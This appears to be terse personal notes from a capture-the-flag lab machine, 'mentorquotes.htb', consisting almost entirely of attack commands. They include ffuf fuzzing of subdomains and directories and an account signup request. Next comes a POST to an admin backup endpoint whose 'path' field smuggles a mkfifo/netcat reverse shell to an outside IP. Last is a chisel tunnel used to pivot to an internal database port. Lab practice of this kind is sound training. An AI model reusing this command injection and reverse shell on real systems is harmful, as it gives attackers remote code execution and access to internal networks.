# Sans titre

OSCP Like: No
Points: 0
Root Flag: No
Status: Not Reviewed
User Flag: No

```bash
ffuf -u "http://mentorquotes.htb" -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -fc 302
```

```bash
ffuf -u "http://api.mentorquotes.htb/FUZZ" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc all -fc 404
```

```bash
curl -X POST http://api.mentorquote.htb/auth/signup \
   -H 'Content-Type: application/json' \
   -d '{"email":"james@smith.com","username":"james", "password":"my_password"}'

{"id":4,"email":"james@smith.com","username":"james"}

curl -X 'POST' \
'http://api.mentorquotes.htb/admin/backup' \
-H 'accept: application/json' \
-H 'Content-Type: application/json' \
-H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BzbWl0aC5jb20ifQ.bH_jgk8K_hBlQgxykR_7mdnOv_4PgL2viRhSOxZq5zg' \
-d '{
"path": "`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.105 1337 >/tmp/f`"
}'

./chisel client -v 10.10.14.105:8888 R:5432:172.22.0.1:5432
```